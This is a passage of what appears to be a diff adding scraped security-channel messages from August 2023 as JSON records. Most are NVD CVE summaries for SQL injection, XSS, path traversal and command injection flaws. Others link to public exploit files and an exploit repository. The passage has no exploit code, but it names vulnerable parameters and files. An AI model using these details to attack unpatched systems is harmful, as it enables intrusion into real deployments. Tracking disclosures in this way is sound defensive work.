+    "message": "‼ CVE-2023-40749 ‼\n\nPHPJabbers Food Delivery Script v3.0 is vulnerable to SQL Injection in the \"column\" parameter of index.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40752 ‼\n\nThere is a Cross Site Scripting (XSS) vulnerability in the \"action\" parameter of index.php in PHPJabbers Make an Offer Widget v1.0.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40751 ‼\n\nPHPJabbers Fundraising Script v1.0 is vulnerable to Cross Site Scripting (XSS) via the \"action\" parameter of index.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "defcon_news",
+    "message": "inDrive: Stored XSS on promo.indrive.com\nhttps://vulners.com/hackerone/H1:2051085?utm_source=rss&utm_medium=rss&utm_campaign=rss",
+    "urls": [],
+    "webpage_description": "Summary: The functionality on https://promo.indrive.com/promocodes allows drivers to find and activate promocodes. It requires a driver ID. When user activates their promocode, the browser makes a POST request to...",
+    "webpage_url": "https://vulners.com/hackerone/H1:2051085?utm_source=rss&utm_medium=rss&utm_campaign=rss"
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40195 ‼\n\nDeserialization of Untrusted Data, Inclusion of Functionality from Untrusted Control Sphere vulnerability in Apache Software Foundation Apache Airflow Spark Provider.When the Apache Spark provider is installed on an Airflow deployment, an Airflow user that is authorized to configure Spark hooks can effectively run arbitrary code on the Airflow node by pointing it at a malicious Spark server. Prior to version 4.1.3, this was not called out in the documentation explicitly, so it is possible that administrators provided authorizations to configure Spark hooks without taking this into account. We recommend administrators to review their configurations to make sure the authorization to configure Spark hooks is only provided to fully trusted users.To view the warning in the docs please visitÂ  https://airflow.apache.org/docs/apache-airflow-providers-apache-spark/4.1.3/connections/spark.html\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "defcon_news",
+    "message": "Busybox cpio directory traversal vulnerability (CVE-2023-39810)\nhttps://www.reddit.com/r/netsec/comments/163gfne/busybox_cpio_directory_traversal_vulnerability/",
+    "urls": [],
+    "webpage_description": "Explore this post and more from the netsec community",
+    "webpage_url": "https://www.reddit.com/r/netsec/comments/163gfne/busybox_cpio_directory_traversal_vulnerability/"
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38025 ‼\n\nSpotCam Co., Ltd. SpotCam FHD 2â€™s hidden Telnet function has a vulnerability of OS command injection. An remote unauthenticated attacker can exploit this vulnerability to execute command injection attack to arbitrary system commands or disrupt service.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38027 ‼\n\nSpotCam Co., Ltd. SpotCam Senseâ€™s hidden Telnet function has a vulnerability of OS command injection. An remote unauthenticated attacker can exploit this vulnerability to execute command injection attack to perform arbitrary system commands or disrupt service.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4561 ‼\n\nCross-site Scripting (XSS) - Stored in GitHub repository omeka/omeka-s prior to 4.0.4.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-22877 ‼\n\nIBM InfoSphere Information Server 11.7 is potentially vulnerable to CSV Injection. A remote attacker could execute arbitrary commands on the system, caused by improper validation of csv file contents. IBM X-Force ID: 244368.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38024 ‼\n\nSpotCam Co., Ltd. SpotCam FHD 2â€™s hidden Telnet function has a vulnerability of using hard-coded Telnet credentials. An remote unauthenticated attacker can exploit this vulnerability to access the system to perform arbitrary system operations or disrupt service.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-33852 ‼\n\nIBM Security Guardium 11.4 is vulnerable to SQL injection. A remote attacker could send specially crafted SQL statements, which could allow the attacker to view, add, modify or delete information in the back-end database. IBM X-Force ID: 257614.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4558 ‼\n\nA vulnerability classified as critical was found in SourceCodester Inventory Management System 1.0. Affected by this vulnerability is an unknown functionality of the file staff_data.php. The manipulation of the argument columns[0][data] leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-238159.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-28",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4557 ‼\n\nA vulnerability classified as critical has been found in SourceCodester Inventory Management System 1.0. Affected is an unknown function of the file app/ajax/search_purchase_paymen_report.php. The manipulation of the argument customer leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-238158 is the identifier assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-27",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4556 ‼\n\nA vulnerability was found in SourceCodester Online Graduate Tracer System 1.0 and classified as critical. Affected by this issue is the function mysqli_query of the file sexit.php. The manipulation of the argument id leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-238154 is the identifier assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-26",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4545 ‼\n\nA vulnerability was found in IBOS OA 4.5.5. It has been classified as critical. Affected is an unknown function of the file ?r=recruit/bgchecks/export&checkids=x. The manipulation leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-238056. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-26",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4543 ‼\n\nA vulnerability was found in IBOS OA 4.5.5. It has been declared as critical. This vulnerability affects unknown code of the file ?r=recruit/contact/export&contactids=x. The manipulation leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-238048. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-26",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39289 ‼\n\nA vulnerability in the Connect Mobility Router component of Mitel MiVoice Connect through 9.6.2208.101 could allow an unauthenticated attacker to conduct an account enumeration attack due to improper configuration. A successful exploit could allow an attacker to access system information.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39707 ‼\n\nA stored cross-site scripting (XSS) vulnerability in Free and Open Source Inventory Management System v1.0 allows attackers to execute arbitrary web scripts or HTML via injecting a crafted payload into the Add Expense parameter under the Expense section.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40587 ‼\n\nPyramid is an open source Python web framework. A path traversal vulnerability in Pyramid versions 2.0.0 and 2.0.1 impacts users of Python 3.11 that are using a Pyramid static view with a full filesystem path and have a `index.html` file that is located exactly one directory above the location of the static view's file system path. No further path traversal exists, and the only file that could be disclosed accidentally is `index.html`. Pyramid version 2.0.2 rejects any path that contains a null-byte out of caution. While valid in directory/file names, we would strongly consider it a mistake to use null-bytes in naming files/directories. Secondly, Python 3.11, and 3.12 has fixed the underlying issue in `os.path.normpath` to no longer truncate on the first `0x00` found, returning the behavior to pre-3.11 Python, un an as of yet unreleased version. Fixes will be available in:Python 3.12.0rc2 and 3.11.5. Some workarounds are available. Use a version of Python 3 that is not affected, downgrade to Python 3.10 series temporarily, or wait until Python 3.11.5 is released and upgrade to the latest version of Python 3.11 series.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39600 ‼\n\nIceWarp 11.4.6.0 was discovered to contain a cross-site scripting (XSS) vulnerability via the color parameter.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "defcon_news",
+    "message": "Business Directory Script 3.2 SQL Injection\nhttps://packetstormsecurity.com/files/174327/bds32-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174327/bds32-sql.txt?utm_source=dlvr.it&utm_medium=twitter"
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "defcon_news",
+    "message": "Gravigra CMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/174323/gravigracms10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174323/gravigracms10-sql.txt?utm_source=dlvr.it&utm_medium=twitter"
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "defcon_news",
+    "message": "G And G Corporate CMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/174320/ggcorporatecms10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174320/ggcorporatecms10-sql.txt"
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2020-11711 ‼\n\nAn issue was discovered in Stormshield SNS 3.8.0. Authenticated Stored XSS in the admin login panel leads to SSL VPN credential theft. A malicious disclaimer file can be uploaded from the admin panel. The resulting file is rendered on the authentication interface of the admin panel. It is possible to inject malicious HTML content in order to execute JavaScript inside a victim's browser. This results in a stored XSS on the authentication interface of the admin panel. Moreover, an unsecured authentication form is present on the authentication interface of the SSL VPN captive portal. Users are allowed to save their credentials inside the browser. If an administrator saves his credentials through this unsecured form, these credentials could be stolen via the stored XSS on the admin panel without user interaction. Another possible exploitation would be modification of the authentication form of the admin panel into a malicious form.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-24394 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Gopi Ramasamy iframe popup plugin <=Â 3.3 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-25981 ‼\n\nAuth. (contributor+) Stored Cross-Site Scripting (XSS) vulnerability in ThemeKraft Post Form plugin <=Â 2.8.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32595 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Palasthotel by Edward Bock, Katharina Rompf Sunny Search plugin <=Â 1.0.2 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32596 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Wolfgang Ertl weebotLite plugin <=Â 1.0.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32575 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in PI Websolution Product page shipping calculator for WooCommerce plugin <=Â 1.3.25 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32756 ‼\n\ne-Excellence U-Office Force has a path traversal vulnerability within its file uploading and downloading functions. An unauthenticated remote attacker can exploit this vulnerability to read arbitrary system files, but canâ€™t control system or disrupt service.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32591 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Cloud Primero B.V DBargain plugin <=Â 3.0.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32518 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Ono Oogami WP Chinese Conversion plugin <=Â 1.1.16 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32577 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Eji Osigwe DevBuddy Twitter Feed plugin <=Â 4.0.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32584 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in John Newcombe eBecas plugin <=Â 3.1.3 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-3425 ‼\n\nOut-of-bounds read issue in M-Files Server versions below 23.8.12892.6 and LTS Service Release Versions before 23.2 LTS SR3 allows unauthenticated user to read restricted amount of bytes from memory.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "sysadm_in_channel",
+    "message": "Suspected PRC Cyber ActorsContinue to Globally Exploit Barracuda ESG Zero-Day Vulnerability (CVE-2023-2868)\n\nAs a part of the FBI investigation into the exploitation of CVE-2023-2868, a zero-day\nvulnerability in Barracuda Network’s Email Security Gateway (ESG) appliances",
+    "urls": []
+}
+{
+    "date": "2023-08-25",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40017 ‼\n\nGeoNode is an open source platform that facilitates the creation, sharing, and collaborative use of geospatial data. In versions 3.2.0 through 4.1.2, the endpoint `/proxy/?url=` does not properly protect against server-side request forgery. This allows an attacker to port scan internal hosts and request information from internal hosts. A patch is available at commit a9eebae80cb362009660a1fd49e105e7cdb499b9.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-24",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-46884 ‼\n\nA potential use-after-free vulnerability existed in SVG Images if the Refresh Driver was destroyed at an inopportune time. This could have lead to memory corruption or a potentially exploitable crash.*Note*: This advisory was added on December 13th, 2022 after discovering it was inadvertently left out of the original advisory. The fix was included in the original release of Firefox 106. This vulnerability affects Firefox < 106.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-24",
+    "from_channel": "defcon_news",
+    "message": "Geeklog 2.1.0b1 SQL Injection\nhttps://packetstormsecurity.com/files/174312/geeklog210b1-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174312/geeklog210b1-sql.txt?utm_source=dlvr.it&utm_medium=twitter"
+}
+{
+    "date": "2023-08-24",
+    "from_channel": "defcon_news",
+    "message": "User Registration And Login And User Management System 3.0 SQL Injection\nhttps://packetstormsecurity.com/files/174309/urlums30-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174309/urlums30-sql.txt"
+}
+{
+    "date": "2023-08-24",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32510 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Rolf van Gelder Order Your Posts Manually plugin <=Â 2.2.5 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-24",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32511 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Booking Ultra Pro Booking Ultra Pro Appointments Booking Calendar Plugin plugin <=Â 1.1.8 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-24",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32516 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in GloriaFood Restaurant Menu â€“ Food Ordering System â€“ Table Reservation plugin <=Â 2.3.6 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-24",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36317 ‼\n\nCross Site Scripting (XSS) vulnerability in sourcecodester Student Study Center Desk Management System 1.0 allows attackers to run arbitrary code via crafted GET request to web application URL.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40176 ‼\n\nXWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. Any registered user can exploit a stored XSS through their user profile by setting the payload as the value of the time zone user preference. Even though the time zone is selected from a drop down (no free text value) it can still be set from JavaScript (using the browser developer tools) or by calling the save URL on the user profile with the right query string. Once the time zone is set it is displayed without escaping which means the payload gets executed for any user that visits the malicious user profile, allowing the attacker to steal information and even gain more access rights (escalation to programming rights). This issue is present since version 4.1M2 when the time zone user preference was introduced. The issue has been fixed in XWiki 14.10.5 and 15.1RC1.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40612 ‼\n\nIn OpenMNS Horizon 31.0.8 and versions earlier than 32.0.2, the file editor which is accessible to any user with ROLE_FILESYSTEM_EDITOR privileges is vulnerable to XXE injection attacks. The solution is to upgrade to Meridian 2023.1.5 or Horizon 32.0.2 or newer. Meridian and Horizon installation instructions state that they are intended for installation within an organization's private networks and should not be directly accessible from the Internet. OpenNMS thanks Erik Wynter for reporting this issue.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "defcon_news",
+    "message": "Traders' Dollars in Danger: CVE-2023-38831 zero-Day vulnerability in WinRAR exploited by cybercriminals to target traders\nhttps://www.reddit.com/r/netsec/comments/15z9m24/traders_dollars_in_danger_cve202338831_zeroday/",
+    "urls": [],
+    "webpage_description": "Posted by sunher444 - No votes and 1 comment",
+    "webpage_url": "https://www.reddit.com/r/netsec/comments/15z9m24/traders_dollars_in_danger_cve202338831_zeroday/"
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32509 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Rolf van Gelder Order Your Posts Manually plugin <=Â 2.2.5 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32499 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Tony Zeoli, Tony Hayes Radio Station by netmixÂ® â€“ Manage and play your Show Schedule in WordPress! plugin <=Â 2.4.0.9 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32505 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Arshid Easy Hide Login plugin <=Â 1.0.7 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-28994 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in UX-themes Flatsome plugin <=Â 3.16.8 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32498 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Easy Form team Easy Form by AYS plugin <=Â 1.2.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32300 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Yoast Yoast SEO: Local plugin <=Â 14.8 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32236 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Booking Ultra Pro Booking Ultra Pro Appointments Booking Calendar Plugin <=Â 1.1.8 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32496 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Bill Minozzi Block Bad Bots and Stop Bad Bots Crawlers and Spiders and Anti Spam Protection plugin <=Â 7.31 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32497 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Supersoju Block Referer Spam plugin <=Â 1.1.9.4 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "RalfHackerChannel",
+    "message": "CVE-2023-36874: Windows LPE\n\nhttps://github.com/Wh04m1001/CVE-2023-36874\n\n#git #exploit #lpe",
+    "urls": []
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "defcon_news",
+    "message": "SugarCRM 12.2.0 SQL Injection\nhttps://packetstormsecurity.com/files/174303/KIS-2023-08.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174303/KIS-2023-08.txt?utm_source=dlvr.it&utm_medium=twitter"
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "defcon_news",
+    "message": "GEN Security+ 4.0 SQL Injection\nhttps://packetstormsecurity.com/files/174289/gensecurity40-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174289/gensecurity40-sql.txt"
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "defcon_news",
+    "message": "FAST TECH CMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/174279/fasttechcms10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174279/fasttechcms10-sql.txt"
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32119 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in WPO365 | Mail Integration for Office 365 / Outlook plugin <=Â 1.9.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4041 ‼\n\nBuffer Copy without Checking Size of Input ('Classic Buffer Overflow'), Out-of-bounds Write, Download of Code Without Integrity Check vulnerability in Silicon Labs Gecko Bootloader on ARM (Firmware Update File Parser modules) allows Code Injection, Authentication Bypass.This issue affects \"Standalone\" and \"Application\" versions of Gecko Bootloader.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-41098 ‼\n\nAn issue was discovered in MISP 2.4.174. In app/Controller/DashboardsController.php, a reflected XSS issue exists via the id parameter upon a dashboard edit.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39026 ‼\n\nDirectory Traversal vulnerability in FileMage Gateway Windows Deployments v.1.10.8 and before allows a remote attacker to obtain sensitive information via a crafted request to the /mgmt/ component.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-23",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2020-24113 ‼\n\nDirectory Traversal vulnerability in Contacts File Upload Interface in Yealink W60B version 77.83.0.85, allows attackers to gain sensitive information and cause a denial of service (DoS).\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-24514 ‼\n\nCross-site Scripting (XSS) vulnerability in Visual Console Module of Pandora FMS could be used to hijack admin users session cookie values, carry out phishing attacks, etc. This issue affects Pandora FMS v767 version and prior versions on all platforms.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39599 ‼\n\nCross-Site Scripting (XSS) vulnerability in CSZ CMS v.1.3.0 allows attackers to execute arbitrary code via a crafted payload to the Social Settings parameter.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37425 ‼\n\nA vulnerability in the web-based management interfaceÂ of EdgeConnect SD-WAN Orchestrator could allow anÂ unauthenticated remote attacker to conduct a storedÂ cross-site scripting (XSS) attack against an administrativeÂ user of the interface. A successful exploit allows anÂ attacker to execute arbitrary script code in a victim'sÂ browser in the context of the affected interface.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48565 ‼\n\nAn XML External Entity (XXE) issue was discovered in Python through 3.9.1. The plistlib module no longer accepts entity declarations in XML plist files to avoid XML vulnerabilities.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37422 ‼\n\nVulnerabilities in the web-based management interface of EdgeConnect SD-WAN Orchestrator could allow an authenticatedÂ remote attacker to conduct a stored cross-site scriptingÂ (XSS) attack against an administrative user of the interface.Â A successful exploit allows an attacker to execute arbitraryÂ script code in a victim's browser in the context of theÂ affected interface.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-23565 ‼\n\nAn issue was discovered in Geomatika IsiGeo Web 6.0. It allows remote authenticated users to retrieve PHP files from the server via Local File Inclusion.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48547 ‼\n\nA reflected cross-site scripting (XSS) vulnerability in Cacti 0.8.7g and earlier allows unauthenticated remote attackers to inject arbitrary web script or HTML in the \"ref\" parameter at auth_changepassword.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37421 ‼\n\nVulnerabilities in the web-based management interface of EdgeConnect SD-WAN Orchestrator could allow an authenticatedÂ remote attacker to conduct a stored cross-site scriptingÂ (XSS) attack against an administrative user of the interface.Â A successful exploit allows an attacker to execute arbitraryÂ script code in a victim's browser in the context of theÂ affected interface.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39141 ‼\n\nwebui-aria2 commit 4fe2e was discovered to contain a path traversal vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48065 ‼\n\nGNU Binutils before 2.40 was discovered to contain a memory leak vulnerability var the function find_abstract_instance in dwarf2.c.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
